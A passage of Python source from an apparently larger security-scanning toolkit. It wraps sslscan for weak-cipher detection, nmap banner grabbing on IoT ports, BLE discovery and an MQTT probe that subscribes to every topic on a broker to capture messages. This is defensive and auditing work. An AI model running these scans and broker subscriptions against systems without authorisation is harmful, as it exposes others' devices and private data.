        cmd = f"sslscan --no-colour {shlex.quote(target)}"
        result = self.layer.run(cmd, timeout=timeout)
        ciphers_found = 0
        vulnerabilities: list[str] = []
        for line in result.stdout.splitlines():
            low = line.lower()
            if "accepted" in low or "cipher" in low:
                ciphers_found += 1
            if any(
                v in low
                for v in [
                    "vulnerable",
                    "heartbleed",
                    "poodle",
                    "beast",
                    "freak",
                    "logjam",
                    "drown",
                    "ssl2",
                    "ssl3",
                    "rc4",
                ]
            ):
                stripped = line.strip()
                if stripped and stripped not in vulnerabilities:
                    vulnerabilities.append(stripped)
        return {
            "command": cmd,
            "ciphers_found": ciphers_found,
            "vulnerabilities": vulnerabilities,
            "returncode": result.returncode,
            "output": result.stdout[-3000:],
        }


class IoTTools:
    """Banner grabbing, Bluetooth BLE scanning, and MQTT probing."""

    # Common IoT ports to banner-grab
    _IOT_PORTS = [21, 22, 23, 80, 443, 554, 1883, 5683, 7547, 8080, 8443, 8883]

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def banner_grab(self, target: str, *, timeout: int = 30) -> dict:
        """Grab banners from common IoT service ports."""
        open_services: list[str] = []
        # Use nmap with a fast service scan instead of individual connects
        ports = ",".join(str(p) for p in self._IOT_PORTS)
        cmd = (
            f"nmap -T4 -sV --open -p {ports} --version-intensity 2 "
            f"-oX - {shlex.quote(target)}"
        )
        result = self.layer.run(cmd, timeout=timeout)
        output = result.stdout
        try:
            root = ET.fromstring(output)
            for host_el in root.findall("host"):
                for port_el in host_el.iter("port"):
                    state_el = port_el.find("state")
                    if (
                        state_el is not None
                        and state_el.get("state") == "open"
                    ):
                        portid = port_el.get("portid", "")
                        svc_el = port_el.find("service")
                        svc = ""
                        if svc_el is not None:
                            svc = svc_el.get("name", "")
                            product = svc_el.get("product", "")
                            if product:
                                svc = f"{svc} ({product})"
                        open_services.append(f"{portid}/tcp {svc}")
        except ET.ParseError:
            pass

        return {
            "command": cmd,
            "services": open_services,
            "count": len(open_services),
            "output": output[-2000:],
        }

    def scan_ble(self, *, duration: int = 10) -> dict:
        """Scan for Bluetooth Low Energy devices using hcitool lescan."""
        cmd = f"timeout {int(duration)} hcitool lescan 2>/dev/null"
        result = self.layer.run(cmd, sudo=True, timeout=duration + 5)
        devices: list[dict] = []
        seen: set = set()
        for line in result.stdout.splitlines():
            m = re.match(
                r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+(.*)", line
            )
            if m:
                mac = m.group(1).strip()
                name = m.group(2).strip()
                if mac not in seen:
                    seen.add(mac)
                    devices.append({"mac": mac, "name": name or "(unknown)"})
        return {
            "command": cmd,
            "devices": devices,
            "count": len(devices),
        }

    def scan_mqtt(
        self, host: str, port: int = 1883, *, timeout: int = 10
    ) -> dict:
        """Probe an MQTT broker for unauthenticated access."""
        # Use mosquitto_sub to subscribe and capture a few messages
        cmd = (
            f"timeout {int(timeout)} mosquitto_sub -h {shlex.quote(host)} "
            f"-p {int(port)} -t '#' -v -C 5 2>/dev/null"
        )
        result = self.layer.run(cmd, timeout=timeout + 5)
        open_broker = result.returncode == 0 and bool(result.stdout.strip())
        messages: list[str] = []
        for line in result.stdout.splitlines():
            stripped = line.strip()
            if stripped:
                messages.append(stripped)

        # Fallback: check if the port is reachable at all
        if not open_broker:
            nc_check = self.layer.run(
                f"nc -z -w3 {shlex.quote(host)} {int(port)}", timeout=5
            )
            open_broker = nc_check.returncode == 0

        return {
            "command": cmd,
            "open": open_broker,
            "messages": messages,
            "host": host,
            "port": port,
        }
